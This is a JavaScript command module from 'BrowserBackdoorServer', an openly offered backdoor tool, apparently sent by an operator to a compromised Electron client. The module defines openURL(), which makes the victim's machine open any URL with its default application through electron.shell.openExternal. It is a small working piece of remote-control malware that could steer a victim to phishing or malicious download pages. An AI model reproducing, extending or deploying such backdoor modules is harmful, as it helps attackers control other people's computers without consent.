// INTERACTIVE
/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Opens a URL with the default application
 * Parameters: URL
 * Returns: undefined
 * Author: IMcPwn
 */

electron = require('electron');

openURL = function (url) {
    electron.shell.openExternal(url);
}

return "\nUsage: openURL(url)\n- url is the URL to open with the default application.";
